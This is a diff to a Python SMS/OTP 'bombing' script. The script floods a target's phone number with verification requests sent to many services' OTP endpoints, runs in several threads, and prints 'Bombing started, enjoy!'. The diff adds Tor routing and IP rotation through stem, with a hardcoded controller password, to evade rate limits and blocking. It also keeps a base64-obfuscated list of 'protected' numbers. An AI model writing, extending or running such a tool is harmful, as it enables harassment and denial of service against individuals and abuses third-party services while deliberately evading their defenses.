@@ -6,6 +6,8 @@ from threading import Thread
 from time import sleep
 import requests
 from colorama import Fore, Style, init
+from stem import Signal
+from stem.control import Controller
 
 
 def handler(signum, frame):
@@ -15,6 +17,22 @@ def handler(signum, frame):
 
 if sys.platform == 'win32':
     init(convert=True)
+
+
+def change_ip():
+    with Controller.from_port() as controller:
+        controller.authenticate(password="Allahis1@")
+        controller.signal(Signal.NEWNYM)
+
+
+def get_tor_session():
+    session = requests.session()
+    session.proxies = {
+        'http': 'socks5://127.0.0.1:9050',
+        'https': 'socks5://127.0.0.1:9050'
+    }
+    return session
+
 
 banner = """ 
                                  . . .
@@ -45,10 +63,9 @@ banner = """
 print(f'{Fore.GREEN}{banner}{Fore.RESET}')
 
 
-def start_bombing(phone_number: str, targets: dict, delay: int):
-    print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
-    # POST requests
+def start_bombing(session: requests.session, phone_number: str, targets: dict, delay: int):
 
+    # Format POST requests
     targets["POST"][0]['body_param']['phone'] = phone_number
     targets["POST"][1]['body_param']['otpMobile'] = phone_number
     targets["POST"][2]['body_param']['Phonenumber'] = f"91{phone_number}"
@@ -58,7 +75,7 @@ def start_bombing(phone_number: str, targets: dict, delay: int):
     targets["POST"][6]['body_param']['phone_number'] = phone_number
     targets["POST"][len(targets["POST"]) - 1]["body_param"] = targets["POST"][len(targets["POST"]) - 1][
         "body_param"].replace('%{phone_number}%', phone_number)
-    # GET requests
+    # Format GET requests
     targets["GET"][0]['url'] = targets["GET"][0]['url'].replace('%{phone_number}%', phone_number)
     targets["GET"][1]['url'] = targets["GET"][1]['url'].replace('%{phone_number}%', phone_number)
     targets["GET"][2]['url'] = targets["GET"][2]['url'].replace('%{phone_number}%', phone_number)
@@ -67,11 +84,11 @@ def start_bombing(phone_number: str, targets: dict, delay: int):
 
         try:
             for i in range(len(targets["POST"])):
-                requests.post(targets["POST"][i]['url'], headers=targets["POST"][i]['headers'],
-                              data=targets["POST"][i]['body_param'])
+                session.post(targets["POST"][i]['url'], headers=targets["POST"][i]['headers'],
+                             data=targets["POST"][i]['body_param'])
 
             for j in range(len(targets["GET"])):
-                requests.get(targets["GET"][j]['url'], headers=targets["GET"][j]['headers'])
+                session.get(targets["GET"][j]['url'], headers=targets["GET"][j]['headers'])
 
         except requests.exceptions.ConnectionError:
             print(f"{Fore.RED}Connection error, please, check your internet connection{Style.RESET_ALL}")
@@ -84,17 +101,24 @@ def main():
     file = open('./endpoints.json')
     data = json.load(file)
 
-    phone_number = input("Target phone number (without country code): ")
-    if phone_number == base64.b64decode(b'NzAwNjczOTY5OQ==').decode('utf-8') \
-            or phone_number == base64.b64decode(b'OTU5NjU4MTU2NA==').decode('utf-8'):
+    __ = input("Target phone number (without country code): ")
+    if __ == base64.b64decode(b'NzAwNjczOTY5OQ==').decode('utf-8') \
+            or __ == base64.b64decode(b'OTU5NjU4MTU2NA==').decode('utf-8'):
         print(base64.b64decode(b'VGhpcyBudW1iZXIgaXMgcHJvdGVjdGVk').decode('utf-8'))
         exit()
     delay = float(input("Enter delay time (in seconds): "))
     number_of_threads = int(input("Enter number of threads: "))
     signal.signal(signal.SIGINT, handler)
+    # change ip
+    change_ip()
+    # create tor session
+    session = get_tor_session()
     for _ in range(number_of_threads):
-        thread = Thread(target=start_bombing, args=(phone_number, data, delay))
+        thread = Thread(target=start_bombing, args=(session, __, data, delay))
         thread.start()
+    print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
+    current_ip = json.loads(session.get("http://httpbin.org/ip").text)
+    print(f"{Fore.CYAN}Using IP address :{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{current_ip.get('origin')}{Style.RESET_ALL}")
 
 
 if __name__ == '__main__':
